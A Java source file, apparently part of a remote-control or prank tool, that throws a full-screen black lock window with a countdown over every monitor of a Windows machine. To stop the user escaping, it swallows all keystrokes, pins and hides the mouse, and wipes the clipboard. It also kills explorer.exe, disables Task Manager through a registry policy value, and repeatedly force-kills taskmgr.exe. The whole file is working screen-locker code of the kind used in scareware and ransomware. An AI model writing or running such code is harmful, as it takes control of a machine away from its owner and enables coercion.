import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.StringSelection;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class ScreenLock {

    private static List<JFrame> activeFrames = new ArrayList<>();
    private static Timer countdownTimer;
    private static Timer enforceTimer;
    private static Timer clipboardTimer;
    private static Timer mouseTimer;
    private static boolean explorerKilled = false;
    private static volatile int remainingSeconds = 0;
    private static String lockTitle = "";
    private static String lockMessage = "";
    private static Robot robot;

    public static boolean isLockActive() {
        return !activeFrames.isEmpty();
    }

    public static void showLockScreen(String titleText, String messageText, int durationMs) {
        closeExisting();

        lockTitle = (titleText == null || titleText.trim().isEmpty()) ? "BILDIRIM" : titleText.toUpperCase();
        lockMessage = (messageText == null || messageText.trim().isEmpty()) ? "" : messageText;
        remainingSeconds = Math.max(1, durationMs / 1000);

        try {
            robot = new Robot();
        } catch (Exception e) {
            robot = null;
        }

        SwingUtilities.invokeLater(() -> {
            try {
                KeyboardFocusManager.getCurrentKeyboardFocusManager().addKeyEventDispatcher(e -> {
                    e.consume();
                    return true;
                });

                killExplorer();

                disableTaskManager();

                clipboardTimer = new Timer("clipboard-clear", true);
                clipboardTimer.scheduleAtFixedRate(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            Toolkit.getDefaultToolkit().getSystemClipboard()
                                .setContents(new StringSelection(""), null);
                        } catch (Exception ignored) {}
                    }
                }, 0, 300);

                BufferedImage cursorImg = new BufferedImage(16, 16, BufferedImage.TYPE_INT_ARGB);
                Cursor blankCursor = Toolkit.getDefaultToolkit().createCustomCursor(cursorImg, new Point(0, 0), "blank");

                GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
                GraphicsDevice[] screens = ge.getScreenDevices();

                Rectangle primaryBounds = screens[0].getDefaultConfiguration().getBounds();
                final int mouseLockX = primaryBounds.x + primaryBounds.width / 2;
                final int mouseLockY = primaryBounds.y + primaryBounds.height / 2;

                for (int i = 0; i < screens.length; i++) {
                    GraphicsDevice dev = screens[i];
                    Rectangle bounds = dev.getDefaultConfiguration().getBounds();
                    final boolean isPrimary = (i == 0);

                    JFrame frame = new JFrame(dev.getDefaultConfiguration());
                    frame.setUndecorated(true);
                    frame.setAlwaysOnTop(true);
                    frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
                    frame.setResizable(false);
                    frame.setFocusableWindowState(true);

                    JPanel paintPanel = new JPanel() {
                        @Override
                        protected void paintComponent(Graphics g) {
                            Graphics2D g2 = (Graphics2D) g;
                            g2.setRenderingHint(RenderingHints.KEY_TEXT_ANTIALIASING, RenderingHints.VALUE_TEXT_ANTIALIAS_ON);
                            g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);

                            int w = getWidth();
                            int h = getHeight();

                            g2.setColor(new Color(0, 0, 0));
                            g2.fillRect(0, 0, w, h);

                            if (isPrimary) {
                                g2.setColor(new Color(255, 255, 255));
                                g2.setFont(new Font("Consolas", Font.BOLD, 56));
                                FontMetrics fmTitle = g2.getFontMetrics();
                                int titleX = (w - fmTitle.stringWidth(lockTitle)) / 2;
                                int titleY = fmTitle.getHeight() + 40;
                                g2.drawString(lockTitle, titleX, titleY);

                                if (!lockMessage.isEmpty()) {
                                    g2.setColor(new Color(190, 190, 190));
                                    g2.setFont(new Font("Consolas", Font.PLAIN, 22));
                                    FontMetrics fmMsg = g2.getFontMetrics();

                                    int maxLineWidth = (int) (w * 0.80);
                                    List<String> lines = new java.util.ArrayList<>();
                                    
                                    String[] words = lockMessage.split("\\s+");
                                    StringBuilder currentLine = new StringBuilder();

                                    for (String word : words) {
                                        String testLine = currentLine.length() == 0 ? word : currentLine + " " + word;
                                        if (fmMsg.stringWidth(testLine) > maxLineWidth) {
                                            if (currentLine.length() > 0) {
                                                lines.add(currentLine.toString());
                                            }
                                            currentLine = new StringBuilder(word);
                                        } else {
                                            currentLine = new StringBuilder(testLine);
                                        }
                                    }
                                    if (currentLine.length() > 0) {
                                        lines.add(currentLine.toString());
                                    }

                                    int lineHeight = fmMsg.getHeight() + 6;
                                    int totalTextHeight = lines.size() * lineHeight;
                                    int startY = (h / 2) - (totalTextHeight / 2);

                                    for (int l = 0; l < lines.size(); l++) {
                                        String lineText = lines.get(l);
                                        int lineX = (w - fmMsg.stringWidth(lineText)) / 2;
                                        int lineY = startY + (l * lineHeight);
                                        g2.drawString(lineText, lineX, lineY);
                                    }
                                }

                                String timerStr = formatTime(remainingSeconds);
                                g2.setColor(new Color(255, 255, 255));
                                g2.setFont(new Font("Consolas", Font.BOLD, 32));
                                FontMetrics fmTimer = g2.getFontMetrics();
                                int timerX = w - fmTimer.stringWidth(timerStr) - 50;
                                int timerY = h - 50;
                                g2.drawString(timerStr, timerX, timerY);
                            }
                        }
                    };
                    paintPanel.setOpaque(false);
                    paintPanel.setCursor(blankCursor);

                    frame.setContentPane(paintPanel);
                    frame.setBounds(bounds);
                    frame.setVisible(true);
                    frame.toFront();
                    frame.requestFocus();

                    frame.addWindowFocusListener(new WindowFocusListener() {
                        @Override
                        public void windowGainedFocus(WindowEvent e) {}
                        @Override
                        public void windowLostFocus(WindowEvent e) {
                            SwingUtilities.invokeLater(() -> {
                                if (frame.isVisible()) {
                                    frame.setAlwaysOnTop(true);
                                    frame.toFront();
                                    frame.requestFocus();
                                }
                            });
                        }
                    });

                    frame.addWindowStateListener(e -> {
                        if ((e.getNewState() & Frame.ICONIFIED) == Frame.ICONIFIED) {
                            frame.setExtendedState(Frame.NORMAL);
                            frame.setBounds(bounds);
                            frame.toFront();
                        }
                    });

                    paintPanel.addMouseListener(new MouseAdapter() {
                        @Override
                        public void mousePressed(MouseEvent e) { e.consume(); }
                        @Override
                        public void mouseReleased(MouseEvent e) { e.consume(); }
                        @Override
                        public void mouseClicked(MouseEvent e) { e.consume(); }
                    });
                    paintPanel.addMouseMotionListener(new MouseMotionAdapter() {
                        @Override
                        public void mouseMoved(MouseEvent e) { e.consume(); }
                        @Override
                        public void mouseDragged(MouseEvent e) { e.consume(); }
                    });

                    activeFrames.add(frame);
                }

                if (robot != null) {
                    mouseTimer = new Timer("mouse-lock", true);
                    mouseTimer.scheduleAtFixedRate(new TimerTask() {
                        @Override
                        public void run() {
                            try {
                                robot.mouseMove(mouseLockX, mouseLockY);
                            } catch (Exception ignored) {}
                        }
                    }, 0, 50);
                }

                enforceTimer = new Timer("enforce-top", true);
                enforceTimer.scheduleAtFixedRate(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            Runtime.getRuntime().exec("taskkill /F /IM taskmgr.exe");
                        } catch (Exception ignored) {}
                    }
                }, 500, 1000);

                countdownTimer = new Timer("countdown", true);
                countdownTimer.scheduleAtFixedRate(new TimerTask() {
                    @Override
                    public void run() {
                        remainingSeconds--;
                        if (remainingSeconds <= 0) {
                            closeExisting();
                        } else {
                            SwingUtilities.invokeLater(() -> {
                                if (!activeFrames.isEmpty()) {
                                    activeFrames.get(0).repaint();
                                }
                            });
                        }
                    }
                }, 1000, 1000);

            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private static String formatTime(int totalSeconds) {
        int d = totalSeconds / 86400;
        int h = (totalSeconds % 86400) / 3600;
        int m = (totalSeconds % 3600) / 60;
        int s = totalSeconds % 60;
        if (d > 0) {
            return String.format("%dd %02d:%02d:%02d", d, h, m, s);
        }
        if (h > 0) {
            return String.format("%02d:%02d:%02d", h, m, s);
        }
        return String.format("%02d:%02d", m, s);
    }

    private static void killExplorer() {
        try {
            Runtime.getRuntime().exec("taskkill /F /IM explorer.exe");
            explorerKilled = true;
        } catch (Exception ignored) {}
    }

    private static void restoreExplorer() {
        if (explorerKilled) {
            try {
                Runtime.getRuntime().exec("explorer.exe");
                explorerKilled = false;
            } catch (Exception ignored) {}
        }
    }

    private static void disableTaskManager() {
        try {
            Runtime.getRuntime().exec(new String[]{
                "reg", "add",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "/v", "DisableTaskMgr", "/t", "REG_DWORD", "/d", "1", "/f"
            });
        } catch (Exception ignored) {}
    }

    private static void enableTaskManager() {
        try {
            Runtime.getRuntime().exec(new String[]{
                "reg", "delete",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                "/v", "DisableTaskMgr", "/f"
            });
        } catch (Exception ignored) {}
    }

    private static void closeExisting() {
        if (countdownTimer != null) { countdownTimer.cancel(); countdownTimer = null; }
        if (enforceTimer != null) { enforceTimer.cancel(); enforceTimer = null; }
        if (clipboardTimer != null) { clipboardTimer.cancel(); clipboardTimer = null; }
        if (mouseTimer != null) { mouseTimer.cancel(); mouseTimer = null; }

        enableTaskManager();
        restoreExplorer();

        SwingUtilities.invokeLater(() -> {
            for (JFrame f : activeFrames) {
                try {
                    f.dispose();
                } catch (Exception ignored) {}
            }
            activeFrames.clear();
        });
    }
}